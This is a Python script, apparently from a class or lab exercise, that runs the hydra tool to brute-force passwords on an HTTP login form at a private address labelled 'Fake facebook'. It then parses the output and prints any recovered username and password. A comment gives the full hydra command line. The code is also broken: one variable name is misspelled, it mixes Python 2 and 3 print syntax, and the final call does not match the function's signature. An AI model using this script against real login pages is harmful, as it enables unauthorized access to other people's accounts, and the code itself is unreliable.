import subprocess

import re

# hydra -l arnav -P passwords.txt 10.202.208.81 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:S=Hello World!"

def has_success_info(line):
    result = re.match('(\d+) of (\d+).*(?P<num_passwords>\d+) valid password(s?) found', line)
    return result is not None and int(result.group('num_passwords')) > 0

def successful(output_lines):
    for line in output_lines:
        if has_success_info(line):
            return True
    return False

def grab_success(output_lines, port, service_mode):
    for line in output_lines:
        if line.startswith("[{}][{}]".format(port, service_mode)):
            parts = line.split()
            login_user_idx = parts.index('login:')
            login_pass_idx = parts.index('password:')
            username = parts[login_user_idx + 1]
            password = parts[login_pass_idx + 1]
            return username, password
    # Shouldn't reach here
    return None


def attack(moduleB, website_info):
    username = moduleB.username
    passwords = moduleB.filename
    ip_addresss, port, service_mode, address_and_details = website_info.get_attack_info()

    proc = subprocess.Popen(['hydra', '-l', username, '-P', passwords, ip_address, '-s', port, service_mode, address_and_details], stdout = subprocess.PIPE)

    output = []
    while True:
        line = proc.stdout.readline()
        if line != '':
            output.append(line.rstrip())
        else:
            break
    if successful(output):
        print('success')
        username, password = grab_success(output, port, service_mode)
        print'credentials:', username, password
    else:
        print('failure')

# From Part B
username = 'arnav'
passwords = '../passwords.txt'

# From the database of things
name = 'Fake facebook'
ip_address = '192.168.2.65'
port = '8080'
service_mode = 'http-post-form'
address_and_details = '/login:username=^USER^&password=^PASS^:S=Hello World!'

attack(username, passwords, ip_address, service_mode, address_and_details, port)
